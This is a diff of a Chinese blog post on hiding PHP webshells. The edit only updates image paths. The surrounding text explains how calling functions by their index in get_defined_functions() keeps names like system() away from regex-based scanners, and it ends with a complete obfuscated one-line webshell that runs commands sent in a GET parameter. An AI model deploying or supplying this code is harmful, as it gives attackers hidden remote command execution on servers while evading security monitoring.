@@ -15,7 +15,7 @@ webshell隐藏是渗透当中一个很重要的权限维持技术，目前也有
 
 关于get_defined_functions()就不在这里介绍了，大家直接去翻官方文档即可，这里看一下还函数的执行结果应该也能明了。
 
-![func_arry](http://reverse-tcp.xyz/static/img/_posts/get_defined_functions/func_arry.png)
+![func_arry](http://reverse-tcp.xyz/static/img/posts/get_defined_functions/func_arry.png)
 
 以下是一个该函数在webshell里边利用的一个思路，主要是可以隐藏危险函数字符串，而利用正则去文件系统及网络流量上匹配危险函数的安全防护对此也就无效了，先看代码：
 
@@ -36,7 +36,7 @@ print callfunc(460, "whoami");
 
 这里自定义了一个callfunc函数，将system函数以索引460传入，并在call_user_func_array()函数执行
 
-![callfunc](http://reverse-tcp.xyz/static/img/_posts/get_defined_functions/callfunc.png)
+![callfunc](http://reverse-tcp.xyz/static/img/posts/get_defined_functions/callfunc.png)
 
 按照这个套路我们继续将*func_get_args()*、*array_shift()*、*call_user_func_array()*也用*get_defined_functions()*来调用，那么就变成了这样
 
@@ -95,5 +95,5 @@ print f(460, 'whoami');
 <?php function f() { $a = get_defined_functions()['internal'];$s = $a[3]();$b = $a[805]($s);$c = $a[$b];return $a[556]($c, $s); }print f($_GET['id'], $_GET['cmd']);?>
 ```
 
-![wenshell](http://reverse-tcp.xyz/static/img/_posts/get_defined_functions/webshell.png)
+![wenshell](http://reverse-tcp.xyz/static/img/posts/get_defined_functions/webshell.png)
 
